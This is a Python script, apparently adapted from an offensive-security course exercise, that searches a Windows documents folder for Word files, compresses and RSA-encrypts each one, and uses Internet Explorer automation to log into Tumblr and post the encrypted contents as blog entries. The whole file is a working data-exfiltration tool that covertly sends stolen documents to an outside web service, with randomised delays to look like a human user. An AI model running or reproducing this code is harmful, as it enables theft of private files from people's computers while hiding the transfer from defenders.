import win32com.client
import os
import time
import fnmatch
import random
import zlib
import base64
from getpass import getpass
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


DOC_TYPE = ".docx"
SEARCH_ROOT = "C:\\Users\\Public\\Documents"  # Limit scope for testing
CHUNK_SIZE = 190  # For RSA 2048-bit with PKCS1_OAEP


username = input("Enter your Tumblr username: ")
password = getpass("Enter your Tumblr password: ")
public_key = """-----BEGIN PUBLIC KEY-----
...YOUR RSA PUBLIC KEY HERE...
-----END PUBLIC KEY-----"""


def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)

def encrypt_string(plaintext):
    if isinstance(plaintext, str):
        plaintext = plaintext.encode()

    print(f"[+] Compressing ({len(plaintext)} bytes)...")
    compressed = zlib.compress(plaintext)
    print(f"[+] Encrypting ({len(compressed)} bytes)...")

    rsa_key = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(rsa_key)

    encrypted = b""
    offset = 0

    while offset < len(compressed):
        chunk = compressed[offset:offset + CHUNK_SIZE]
        encrypted += cipher.encrypt(chunk)
        offset += CHUNK_SIZE

    encoded = base64.b64encode(encrypted)
    print(f"[+] Encrypted and base64-encoded ({len(encoded)} bytes).")
    return encoded.decode()

def encrypted_post(filename):
    with open(filename, "rb") as f:
        contents = f.read()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body

def random_sleep():
    time.sleep(random.randint(3, 7))

def login_to_tumblr(ie):
    wait_for_browser(ie)
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    try:
        form = ie.Document.forms[0] if ie.Document.forms.length > 0 else None
        if form:
            form.submit()
    except Exception as e:
        print(f"[!] Error submitting login form: {e}")

    wait_for_browser(ie)

def post_to_tumblr(ie, title, post):
    wait_for_browser(ie)
    full_doc = ie.Document.all
    title_box = None
    post_form = None

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            i.focus()
        elif i.id == "create_post":
            post_form = i
            i.focus()

    if title_box and post_form:
        random_sleep()
        title_box.focus()
        random_sleep()
        post_form.children[0].click()
        wait_for_browser(ie)
        print("[+] Post submitted.")
    else:
        print("[!] Could not locate post elements.")

def exfiltrate(document_path):
    print(f"[+] Launching IE to post: {document_path}")
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)
    login_to_tumblr(ie)

    print("[+] Encrypting and posting...")
    title, body = encrypted_post(document_path)
    post_to_tumblr(ie, title, body)

    ie.Quit()
    print("[+] Done.\n")

def main():
    for parent, dirs, files in os.walk(SEARCH_ROOT):
        for filename in fnmatch.filter(files, f"*{DOC_TYPE}"):
            document_path = os.path.join(parent, filename)
            print(f"[!] Found: {document_path}")
            exfiltrate(document_path)
            user_input = input("Continue to next document? (Y/n): ").strip().lower()
            if user_input == 'n':
                print("[-] Stopping exfiltration.")
                return

if __name__ == "__main__":
    main()
